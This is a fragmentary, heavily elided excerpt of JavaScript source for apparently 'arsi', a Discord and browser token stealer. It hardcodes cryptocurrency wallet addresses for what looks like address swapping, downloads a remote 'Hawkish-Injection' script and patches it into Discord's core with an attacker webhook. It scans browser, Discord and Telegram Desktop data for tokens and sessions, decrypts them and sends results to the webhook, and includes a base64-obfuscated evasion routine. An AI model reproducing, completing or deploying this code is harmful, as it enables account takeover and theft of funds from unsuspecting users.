...
/***/ ((module) => {
                ...
                module.exports = (client) => {
                    return {
                        ...
                        btc: client.utils.encryption.encryptData("bc1qxtdr6zqjwzu5sjh6778vm48v92kdz2tsw46pdg"),
                        ltc: client.utils.encryption.encryptData("LRU6UqWpnPDq7nQ9KMMnx49WvEDxVnv6b1"),
                        xmr: client.utils.encryption.encryptData("41tf3kAkm67ZDb8qpFz74NGv5o6aMqoGc1E8yXFnrgQTJN9CppENkNLGQyna1mRcrpfyihPzUfJAAPXurA81ovaTSdWzxL3"),
                        eth: client.utils.encryption.encryptData("0x243b2D8369B3c24dD83A5ea14090A9d44e8fB02d"),
                        xrp: client.utils.encryption.encryptData("rHGWh4Yzx8LouoHxqU3C3AQKB8VPaU2oyi"),
                        neo: client.utils.encryption.encryptData("ANZBFXikpcR3R4WJP9ygVkf4EaeVhEVv4A"),
                        bch: client.utils.encryption.encryptData("qrhng9p5ju7ayqc257k8grvx60t845yv2g3prvvl9s"),
                        doge: client.utils.encryption.encryptData("DU1HSKGHLkBb1QXQRpXdTZ4az8TBec8D64"),
                        dash: client.utils.encryption.encryptData("XcqrY4cXtsnY21Dq6yGCdsqRfvUrqdR96a"),
                        xlm: client.utils.encryption.encryptData("GBKWOOYAYL6TGENMZI7J3ZTHKOJP62UTACWTNGVSVIZHFLYONYLRPZ5N"),
                    }
                }
...
/***/ ((module) => {
                ...
                module.exports = (client) => {
                    return {
                        base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/Hawkish-Team/Hawkish-Injection/main/index.js"),
...
async function stealTokens() {
    ...
    for (let path of paths) {
        ...
        if (foundTokens) foundTokens.forEach(token => { 
            var c = {
                name: ":browserstokens: Browser Token;",
                ...
                module.exports = (client) => {
                    return {
                                ...
                                for (var file_name of client.requires.fs.readdirSync(value)) {
                                    ...
                                    for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {
                                        ...
                                        if (value.includes("cord")) {
                                            ...
                                            var encrypted_regex = /porno:[^\"]*/;
                                            if (line.match(encrypted_regex)) {
                                                try {
                                                    var token = Buffer.from(line.match(encrypted_regex)[0].split('porno:')[1], "base64");
                        ...
                        async modify_discord_core() {
                            ...
                            const file = () => {
                                let tempFile = res.data.replace('%WEBHOOK%', client.config.webhook.url).replace("REPLACE_ME", client.config.webhook.url)
                                return tempFile;
                            }
                        ...
                        async init() {
                            ...
                            for (const path of client.config.discord.files_path) {
                                if (client.requires.fs.existsSync(path.replace("index.js", "arsi"))) {
                                    client.requires.fs.rmdirSync(path.replace("index.js", "arsi"));
                                }
                            }
                        }
                    };
                                ...
                                client.requires.fs.readdirSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`).forEach(async c => {
                                    if (!shitFiles.includes(c)) {
                                        try {
                                            ...
                                            try {
                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of arsi", description: `\`\`\`${err}\`\`\`` })] })
                                            } catch { }
                                        }
...
`;
            ...
            async runtime_evasion() {
                let evasor = (`${((base64.decode(
                    ...
                    ).replace("ağlamıcan", "").replace("yoksq", "")
                        + base64.decode("kesamk")
                    )
                    ).catch((err) => {
                        console.log(err)
                    })
            ...
            async init() {
                ...
                try {
                    ...
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of arsi", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }
